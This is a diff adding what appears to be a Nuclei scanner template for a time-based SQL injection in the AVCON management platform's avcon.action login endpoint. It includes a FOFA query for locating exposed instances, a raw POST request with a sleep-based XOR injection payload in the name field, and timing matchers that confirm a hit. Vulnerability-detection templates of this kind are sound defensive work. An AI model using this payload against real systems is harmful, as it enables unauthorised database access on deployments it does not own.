@@ -1,0 +1,32 @@
+id: avcon-xtgl-name-sqli
+
+info:
+  name: avcon-xtgl-name-sqli
+  author: yy
+  severity: high
+  description: AVCON综合管理平台可以实现各种子系统图像集成管理和音视频交互操作,将图像传输、视频监控、指挥调度、视频会议等系统融合，AVCON综合管理平台avcon.action存在时间注入漏洞。
+  tags: avcon,sqli
+  metadata:
+    fofa-qeury: title="AVCON-系统管理平台"
+    veified: true
+    max-request: 1
+
+http:
+  - raw:
+      - |              
+        POST /avcon.action HTTP/1.1
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)
+        Host: 
+
+        name=0'XOR({{mysql}})XOR'Z&password=u]H[ww6KrA9F.x-F
+
+    payloads:
+      mysql:
+        - "if(now()=sysdate()%2Csleep(6)%2C0)"
+               
+    matchers:     
+      - type: dsl
+        name: mysql
+        dsl:
+          - "status_code_1 == 200 && duration>=5 && duration<=8 && contains(body,'登录失败,请查询您的信息输入是否正确') && contains(header,'text/plain')" 
